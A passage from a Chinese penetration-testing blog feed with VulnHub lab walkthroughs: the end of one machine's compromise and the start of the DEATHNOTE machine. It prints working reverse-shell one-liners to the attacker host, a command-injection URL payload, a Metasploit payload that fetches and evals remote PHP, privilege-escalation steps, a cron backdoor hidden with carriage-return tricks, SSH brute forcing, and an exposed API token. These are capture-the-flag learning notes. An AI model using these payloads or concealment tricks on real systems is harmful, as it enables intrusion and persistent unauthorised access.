class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">python 反弹shell代码</span></span><br><span class=\"line\">python -c &#x27;import socket,subprocess,os;</span><br><span class=\"line\">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.135 &quot;,4444));</span><br><span class=\"line\">os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);</span><br><span class=\"line\">os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">构造地址</span></span><br><span class=\"line\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=python%20-c%20%27import%20socket,subprocess,os;%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.31.135%22,4444));%20os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27</span><br></pre></td></tr></table></figure>\n<p>如果页面有 html 限制，在审查元素中修改即可</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-171.png\" alt></p>\n<h3 id=\"msf生成php反弹\"><a class=\"markdownIt-Anchor\" href=\"#msf生成php反弹\">#</a> msf 生成 php 反弹</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">msf生成php木马</span></span><br><span class=\"line\">use exploit/multi/script/web_delivery</span><br><span class=\"line\">set target 1</span><br><span class=\"line\">set payload php/meterpreter/reverse_tcp</span><br><span class=\"line\">set lhost 192.168.31.135</span><br><span class=\"line\">set lport 4444</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将msf生成的php反弹shell的代码直接粘贴在url地址上即可</span></span><br><span class=\"line\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=php%20-d%20allow_url_fopen=true%20-</span><br><span class=\"line\"><span class=\"meta prompt_\">r%</span><span class=\"language-bash\">20%22eval(file_get_contents(%27http://192.168.31.135:8080/Dk00YRQ%27,%20false,%20stream_context_create([%27ssl%27=%3E[%27verify_peer%27=%3Efalse,%27verify_peer_name%27=%3Efalse]])));%22</span></span><br></pre></td></tr></table></figure>\n<p>在此阶段，不要退出 msf，只要 msf 在线，生成的 php 代码运行之后，msf 就会接收到 sessions</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-172.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"stty-异常处理\"><a class=\"markdownIt-Anchor\" href=\"#stty-异常处理\">#</a> stty 异常处理</h3>\n<p>注意使用 msf 的时候如果也用了 stty 会出现下面这个问题</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-173.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">即enter键被转化为了^M 此时再输入任何命令都无法执行了</span><br><span class=\"line\">哪怕重启msf也无效，这里需要先退出msf，并执行stty sane，可将问题解决</span><br><span class=\"line\">命令sane最常出现在大多数终端的stty选项的集合中，它并不改变通信信道</span><br><span class=\"line\">的速率，但当终端发生混乱时，通常能够产生有益的效果。</span><br></pre></td></tr></table></figure>\n<h3 id=\"权限移到另一shell\"><a class=\"markdownIt-Anchor\" href=\"#权限移到另一shell\">#</a> 权限移到另一 shell</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">当前终端：</span></span><br><span class=\"line\">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.31.135/4445 0&gt;&amp;1</span><br><span class=\"line\">nc - lvvp 4445</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">新的终端：</span></span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">stty raw -echo;fg</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-174.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"sudovim提权\"><a class=\"markdownIt-Anchor\" href=\"#sudovim提权\">#</a> sudo (vim) 提权</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo -l 发现使用waldo执行vim可以免密</span><br><span class=\"line\">sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf</span><br><span class=\"line\">esc --&gt; :!/bin/bash</span><br><span class=\"line\">esc --&gt; :!bash -i &gt;&amp; /dev/tcp/192.168.31.135/4447 0&gt;&amp;1 可拿到反弹shell</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-175.png\" alt></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-176.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"脏牛提权\"><a class=\"markdownIt-Anchor\" href=\"#脏牛提权\">#</a> 脏牛提权</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://github.com/firefart/dirtycow/archive/refs/heads/master.zip</span><br><span class=\"line\">scp -r parallels@192.168.31.135:~/Desktop/tool/dirtycow/dirtycow-master /tmp</span><br><span class=\"line\">cd dirtycow-master</span><br><span class=\"line\">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class=\"line\">./dirty</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-177.png\" width=\"570\" alt=\"Image\">\n服务器崩溃，提权失败，需要重启服务器\n<h3 id=\"issri-攻击-irc\"><a class=\"markdownIt-Anchor\" href=\"#issri-攻击-irc\">#</a> issri 攻击 irc</h3>\n<ol>\n<li>修改防火墙规则，允许链接 irc<br>\n 在 www-data 用户的时候，发现可以直接调用 root 改变 iptables</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看当前的防火墙规则</span></span><br><span class=\"line\">sudo iptables -L</span><br><span class=\"line\"></span><br><span class=\"line\">同由于它是一个易受攻击的机器，我们看到我们从外部发送到irc的包通过使,用授予所有用户的管理 iptables 的权限被丢弃，我们删除了这个丢弃规则。</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">重写第二条规则以允许端口 6667 上的 TCP 连接</span></span><br><span class=\"line\">sudo iptables -R INPUT 2 -p tcp --dport 6667 -j ACCEPT</span><br><span class=\"line\">sudo iptables -L</span><br><span class=\"line\"></span><br><span class=\"line\">而在nmap扫描端口时也出现了 6667 irc服务</span><br><span class=\"line\">改变iptables之后我们可以通过irssi连接到irc</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-178.png\" width=\"570\" alt=\"Image\">\n<ol start=\"2\">\n<li>\n<p>issri 连接至 irc<br>\n <code>irssi -c 192.168.31.5 -p 6667 列出频道 /list</code> <br>\n<img data-src=\"/N1h1l157/VULNHUB/image-179.png\" width=\"520\" alt=\"Image\"></p>\n</li>\n<li>\n<p>加入了 wallabyschat 频道 /join #wallabyschat<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-180.png\" alt></p>\n</li>\n<li>\n<p>列出选项 .help<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-181.png\" alt></p>\n</li>\n<li>\n<p>查看私密信息 /window 3<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-182.png\" alt></p>\n</li>\n<li>\n<p>看到 run 似乎有用，返回 /window 2, 执行 run<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-183.png\" alt></p>\n</li>\n</ol>\n<p>只有 waldo 才能执行，我们换名字 /nick waldo<br>\n 此时更名不成功，因为正有 waldo 用户的进程 tmux 使用着</p>\n<ol start=\"7\">\n<li>伪造身份登陆 irssi</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">通过sudo -l中的vim权限设置错误提升权限</span><br><span class=\"line\">sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf</span><br><span class=\"line\">esc --&gt; :!/bin/bash 提权至waldo权限</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-184.png\" width=\"470\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这里有一个irssi.sh的文件，会以waldo的身份运行shell</span><br><span class=\"line\">他的设置有问题。如果 Tmux 宕机，他的 IRC 连接也会宕机。</span><br><span class=\"line\">pkill tmux</span><br><span class=\"line\">who</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-185.png\" width=\"470\" alt=\"Image\">\n<ol start=\"8\">\n<li>\n<p>在 irssi 中修改别名为 waldo：/nick waldo<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-186.png\" width=\"520\" alt=\"Image\"></p>\n</li>\n<li>\n<p>现在我们用 waldo 身份来运行 run 看会有什么效果<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-187.png\" alt></p>\n</li>\n</ol>\n<h3 id=\"suid-python提权\"><a class=\"markdownIt-Anchor\" href=\"#suid-python提权\">#</a> SUID python 提权</h3>\n<p>可以看到的是，我们用 run 执行命令的时候调用的是 wallabyshot 的身份<br>\n我们可以构造 payload 尝试将 wallabyshot 身份的 shell 反弹出来</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">这是一个python反弹shell的代码，尝试运行</span></span><br><span class=\"line\">.run python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.135 &quot;,4448));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-188.png\" alt></p>\n<p>作为 waldo，我运行 .run 并从机器人收到 FileNotFound 错误。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FileNotFoundError: [Errno 2] No such file or directory: &#x27;None&#x27; (file &quot;/usr/lib/python3.5/subprocess.py&quot;, line 1551, in _execute_child)</span><br></pre></td></tr></table></figure>\n<p>adm 组确实看起来很有希望。由于 .run 需要一个文件，因此我创建了一个包含以下内容的文件：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\">sudo -l</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用具有s权限的python进行提权, 修改下一个脚本以将 suid 位应用于 python 可执行文件：</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\">sudo chmod 4777 /usr/bin/python2.7</span><br></pre></td></tr></table></figure>\n<p>通过 irssi 执行此脚本，将 python2.7 添加上 SUID 权限<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-189.png\" width=\"270\" alt=\"Image\"></p>\n<p>此后可以退出 irssi 了 /quit</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls - al /usr/bin/python2.7</span><br><span class=\"line\">python -c &quot;import os; os.setuid(0); os.system(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-190.png\" width=\"520\" alt=\"Image\">\n<p>提权成功拿到了 root 权限</p>\n<h3 id=\"隐蔽cron权限维持\"><a class=\"markdownIt-Anchor\" href=\"#隐蔽cron权限维持\">#</a> 隐蔽 cron 权限维持</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看当前计划任务有哪些</span> </span><br><span class=\"line\">crontab -l</span><br><span class=\"line\"></span><br><span class=\"line\">cat &gt; /root/.first.sh &lt;&lt;EOF</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1</span><br><span class=\"line\">EOF</span><br><span class=\"line\"></span><br><span class=\"line\">cat &gt; /root/.second.sh &lt;&lt; EOF</span><br><span class=\"line\">(crontab -l;printf &quot;*/1 * * * * /root/.first.sh;\\rno crontab for `whoami`%100c\\n&quot;)|crontab -</span><br><span class=\"line\">EOF</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">*/1 * * * *：每隔 1 分钟执行一次；</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">/r：<span class=\"built_in\">cat</span>默认支持 \\r 回车符 \\n 换行符 \\f 换页符这些符号，会导致显示截断隐藏命令，隐藏真实的计划任务；</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">%100c：格式化输出一个字符，前面 99 个空格补齐。使用空格帮助我们把前面的内容在 crontab 中遮盖掉；</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">如果想让创建的文件隐蔽性更强，可以创建名为<span class=\"string\">&quot;..&quot;</span>、“...”或以..等开头的文件。</span></span><br><span class=\"line\"></span><br><span class=\"line\">chmod 777 .first.sh</span><br><span class=\"line\">chmod 777 .second.sh</span><br><span class=\"line\">/root/.second.sh</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-191.png\" width=\"520\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">如果发现无法运行，可以通过下列两个命令查看详细计划任务</span></span><br><span class=\"line\">cat /var/spool/cron/crontabs/root -A</span><br><span class=\"line\">crontab -e 或者 vi /etc/crontab</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在kali机器上监听 4444 端口，每隔一分钟收到将会一次shell</span></span><br><span class=\"line\">nc - lvvp 4444</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">执行一下命令产生一个标准的shell：</span></span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">stty raw -echo;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-192.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 只要开启 kali 的 4444 端口，很快就会收到 root 账户的 shell</p>\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/111%20DEATHNOTE/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/111%20DEATHNOTE/",
            "title": "VULNHUB 11 DEATHNOTE",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZGVhdGhub3RlLTEsNzM5Lw==\">https://www.vulnhub.com/entry/deathnote-1,739/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpb253ZXJzb24vYXJ0aWNsZS9kZXRhaWxzLzEyMTU5NDU0NQ==\">https://blog.csdn.net/lionwerson/article/details/121594545</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 DEATHNOTE：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>\n<p>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></p>\n</li>\n<li>\n<p>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</p>\n</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>获取靶机 ip 地址</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">去除一些已知ip的机器，对剩余IP进行端口扫描，判断目标IP</span></span><br><span class=\"line\">sudo nmap -PA 192.168.31.107 --excludefile myip.txt</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">或者使用 arp 扫描</span></span><br><span class=\"line\">sudo arp -l</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-229.png\" width=\"590\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.212</p>\n<ol start=\"4\">\n<li>确认靶机 ip 开放的端口信息</li>\n</ol>\n<p><code>sudo nmap -A -p- 192.168.31.212 -oN /tmp/deathnote.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-230.png\" width=\"480\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22, 80</p>\n<h3 id=\"wpscan-扫描-wordpress\"><a class=\"markdownIt-Anchor\" href=\"#wpscan-扫描-wordpress\">#</a> wpscan 扫描 wordpress</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjEyLw==\">http://192.168.31.212/</span> 进行信息收集<br>\n网页发生跳转，可直接修改本地 hosts 文件，改变 dns 解析<br>\n /etc/hosts 中添加 192.168.31.212 deathnote.vuln</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-231.png\" alt></p>\n<p>网站是一个 wordpress 网站，可直接利用 wpscan 扫描</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过wpscan对网站的用户名进行枚举</span></span><br><span class=\"line\">wpscan --url http://192.168.31.212/wordpress/ --enumerate u --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-232.png\" width=\"550\" alt=\"Image\">\n<p>-&gt; 得到网站的用户名有 kira</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">根据用户名kira继续扫描密码看是否能扫到</span></span><br><span class=\"line\">wpscan --url http://192.168.31.212/wordpress/ -U kira -P /usr/share/wordlists/rockyou.txt --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc</span><br></pre></td></tr></table></figure>\n<p>-&gt; 没有扫到用户 kira 的密码</p>\n<p>翻阅网站可点击的地方，找到一处提示</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-233.png\" alt></p>\n<p>根据提示，访问 http://192.168.31.212/notes.txt</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-234.png\" width=\"420\" alt=\"Image\">\n<p>没有找到这个提示文件</p>\n<p>顺便访问一下爬虫协议的文件：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjEyL3JvYm90cy50eHQ=\">http://192.168.31.212/robots.txt</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-235.png\" width=\"450\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">根据提示下载 jpg</span></span><br><span class=\"line\">wget http://192.168.31.212/important.jpg</span><br><span class=\"line\">cat important.jpg</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-236.png\" width=\"520\" alt=\"Image\">\n<p>新的提示，网站密码应该在网站的页面上</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-237.png\" alt></p>\n<p>-&gt; 发现疑似密码的字符串 iamjustic3</p>\n<h3 id=\"wordpress-后台突破\"><a class=\"markdownIt-Anchor\" href=\"#wordpress-后台突破\">#</a> wordpress 后台突破</h3>\n<p>可以使用 msf 直接 getshell，或者在后台寻找突破反弹 shell<br>\nwordpress 的后台 wp-login：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjEyL3dvcmRwcmVzcy93cC1sb2dpbi5waHA=\">http://192.168.31.212/wordpress/wp-login.php</span><br>\n 用户名 kira 密码 iamjustic3</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-238.png\" alt></p>\n<p>翻阅后台文件，找到了 notes.txt</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-239.png\" alt></p>\n<p>点击进入到 notes.txt 可以找到这个文件的 url 地址</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-240.png\" alt></p>\n<p>下载到本地，查看此文件查询更多详细的信息</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt</span><br><span class=\"line\">cat notes.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-241.png\" alt></p>\n<h3 id=\"hydra-爆破-ssh\"><a class=\"markdownIt-Anchor\" href=\"#hydra-爆破-ssh\">#</a> hydra 爆破 SSH</h3>\n<p>发现是一个密码文件，尝试用 hydra 进行爆破 ssh 登陆</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hydra -l kira - P notes.txt ssh://192.168.31. 212 - f -t 4 -I -vV -o hydra.ssh</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-242.png\" alt></p>\n<p>-&gt; 爆破失败，无法用用户 kira 登陆到此服务器</p>\n<p>前面得到一个线索 user.txt 中可能藏着一些敏感的用户<br>\n此时我们已经拿到了后台的权限，可以访问<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2RlYXRobm90ZS52dWxuL3dvcmRwcmVzcy93cC1jb250ZW50L3VwbG9hZHMvMjAyMS8wNy9ub3Rlcy50eHQ=\"> http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt</span><br>\n 获取到目标机器密码的列表，我们可以尝试访问<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2RlYXRobm90ZS52dWxuL3dvcmRwcmVzcy93cC1jb250ZW50L3VwbG9hZHMvMjAyMS8wNy91c2VyLnR4dA==\"> http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-243.png\" alt></p>\n<p>找到了敏感的 user.txt 文件，可以用做 hydra 的爆破用户名的字典，可以将疑似网站用户的昵称提前，如在网站上看到的 kira，l<br>\n 如果用户名刚好是这些，可以很快的提高爆破速度</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt</span><br><span class=\"line\">hydra -L user.txt -P notes.txt ssh://192.168.31. 212 -f -t 4 -I -vV -o hydra.ssh</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-244.png\" alt></p>\n<p>-&gt; 用户名 l 密码 death4me</p>\n<h3 id=\"cyberchef-解密\"><a class=\"markdownIt-Anchor\" href=\"#cyberchef-解密\">#</a> CyberChef 解密</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">登陆到目标服务器</span> </span><br><span class=\"line\">ssh l@192.168.31.212</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">收集服务器的相关信息</span></span><br><span class=\"line\">cat /etc/issue &amp;&amp; uname -a &amp;&amp; sudo -l</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-245.png\" alt></p>\n<p>-&gt; 用户 l 在目标机器上没有 sudo 权限</p>\n<p>翻阅目录，找到了下面这个加密文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-246.png\" 